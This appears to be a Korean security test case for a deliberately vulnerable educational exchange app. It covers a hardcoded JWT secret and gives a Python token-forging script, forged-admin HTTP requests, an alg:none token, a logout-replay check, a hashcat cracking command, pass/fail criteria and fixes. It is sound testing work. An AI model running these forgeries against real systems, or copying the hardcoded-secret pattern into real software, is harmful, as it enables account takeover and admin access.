@@ -1,0 +1,125 @@
+================================================================================
+[VCE-EX-16] 인증 세션 및 토큰값 안전성 설정 여부
+도메인: exchange
+================================================================================
+
+1. 진단 항목 개요
+   - 항목명: JWT 시크릿 하드코딩 → 토큰 위조 가능
+   - 번호: EX-16
+   - 위험도: Critical
+   - OWASP: A07:2021 – Identification and Authentication Failures
+
+2. 대상 기능 & 엔드포인트
+   - 로컬:  POST http://localhost:8080/api/auth/login
+   - 운영:  https://vceapp.com/api/auth/login
+   - HTTP 메서드: POST (로그인) → JWT 획득 후 모든 인증 API 대상
+   - 인증 요건: 없음 (공격 자체가 인증 우회)
+
+   영향 받는 엔드포인트:
+   - GET  /api/auth/me
+   - GET  /api/orders
+   - POST /api/orders
+   - GET  /api/admin/members (ADMIN 위조 시)
+
+3. 취약점 원리 (Why this works)
+   JwtTokenProvider.java:18 에서 JWT 서명 시크릿 키가 소스코드에 하드코딩되어 있다:
+     private static final String SECRET_KEY =
+       "vce_secret_key_for_educational_purpose_only_do_not_use_in_production";
+
+   이 키를 알면 공격자는 임의의 사용자(이메일, 역할)로 서명이 유효한 JWT를 직접 생성할 수 있다.
+   알고리즘이 HS256(대칭키)이므로 서명 키 = 검증 키가 동일하다.
+
+   추가 취약점:
+   - JWT에 JTI(JWT ID) 없음 → 로그아웃 후에도 토큰 재사용 가능
+   - 토큰 만료 시간이 길면 탈취 후 장기간 사용 가능
+   - alg:none 공격: 알고리즘을 none으로 설정하면 서명 검증 우회 가능
+
+4. 테스트 절차 (Step-by-step)
+
+   [사전 준비]
+   - 정상 로그인으로 JWT 획득
+   - jwt.io 또는 Python jwt 라이브러리 준비
+
+   Step 1. JWT 구조 분석 (jwt.io 활용)
+   획득한 JWT를 jwt.io Debugger에 붙여넣어 Payload 확인:
+   {
+     "sub": "test@vce.com",
+     "role": "USER",
+     "iat": 1700000000,
+     "exp": 1700086400
+   }
+
+   Step 2. 하드코딩 시크릿으로 ADMIN JWT 위조
+
+   Python 스크립트:
+   import jwt, time
+   SECRET = "vce_secret_key_for_educational_purpose_only_do_not_use_in_production"
+   payload = {
+       "sub": "attacker@evil.com",
+       "role": "ADMIN",
+       "iat": int(time.time()),
+       "exp": int(time.time()) + 86400 * 365
+   }
+   token = jwt.encode(payload, SECRET, algorithm="HS256")
+   print(token)
+
+   Step 3. 위조 토큰으로 관리자 API 접근
+   --- HTTP 요청 예시 ---
+   GET /api/admin/members HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <위조된_ADMIN_JWT>
+   ---
+
+   --- HTTP 요청 예시 ---
+   PATCH /api/admin/members/1/status HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <위조된_ADMIN_JWT>
+   Content-Type: application/json
+
+   {"status": "BANNED"}
+   ---
+
+   Step 4. alg:none 공격 시도
+   헤더를 {"alg":"none","typ":"JWT"} 로 변경하고 서명 제거:
+
+   --- HTTP 요청 예시 ---
+   GET /api/auth/me HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbkB2Y2UuY29tIiwicm9sZSI6IkFETUlOIiwiZXhwIjo5OTk5OTk5OTk5fQ.
+   ---
+
+   Step 5. 로그아웃 후 토큰 재사용 (JTI 없음)
+   1. 로그인 → JWT 저장
+   2. 로그아웃 API 호출 (있는 경우)
+   3. 저장해둔 JWT로 /api/auth/me 접근
+   --- HTTP 요청 예시 ---
+   GET /api/auth/me HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <로그아웃_전_JWT>
+   ---
+   로그아웃 후에도 200 응답이면 취약
+
+   Step 6. hashcat으로 시크릿 키 크래킹 시도
+   hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt
+
+5. 취약 여부 판단 기준
+   ✅ 취약 (Vulnerable):
+      - 위조 ADMIN JWT로 GET /api/admin/members → HTTP 200 + 사용자 목록 반환
+      - alg:none 토큰으로 인증 통과
+      - 로그아웃 후 토큰 재사용 → 200 응답
+   ✗ 안전 (Not Vulnerable):
+      - 위조 토큰 → HTTP 401 Unauthorized
+      - "Invalid token signature" 응답
+      - alg:none 거부
+
+6. 예상 취약 포인트 (코드 위치)
+   - JwtTokenProvider.java:18 — SECRET_KEY 소스코드 하드코딩
+   - JwtTokenProvider.java:47-53 — Jwts.builder()로 토큰 생성 시 하드코딩 키 사용
+   - JwtTokenProvider.java — JTI 필드 없음, 블랙리스트 없음
+
+7. 권고 조치
+   - 시크릿 키 환경변수화: @Value("${jwt.secret}") private String secretKey;
+   - 키 길이 최소 256비트 이상 무작위 문자열
+   - JTI 필드 추가 및 로그아웃 시 Redis 블랙리스트 등록
+   - 알고리즘 서버에서 강제 지정 (클라이언트 제공 alg 무시)
+   - 토큰 만료 시간 단기 설정 (Access: 15분, Refresh: 7일)
